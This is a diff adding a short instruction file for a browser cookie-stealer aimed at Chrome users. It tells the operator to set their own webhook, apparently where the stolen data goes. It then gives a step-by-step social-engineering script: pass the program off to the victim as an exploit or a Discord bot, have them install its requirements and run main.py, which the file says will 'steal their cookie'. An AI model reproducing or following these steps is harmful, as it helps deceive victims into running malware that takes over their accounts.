@@ -1,0 +1,9 @@
+READ THIS!!!! PUT THE VARIABLE WEBHOOK AS YOUR WEBHOOK OR THIS WILL NOT WORK. THIS IS ONLY FOR CHROME BROWSERS!!
+
+
+1. tell them to install the link in "install.txt"
+2. once done, tell them you made an exploit or discord bot as "main.py" or whatever you want to call install. then tell them to drag to desktop
+3. tell them to open cmd prompt. then send them the "requirements.txt" file tell them to put it on their desktop.
+4. tell them to go back to cmd prompt and type "cd desktop"
+5. tell them to type "pip install -r requirements.txt"
+6. then tell them to type "main.py" in cmd prompt, this will run the .py file and steal their cookie ;)
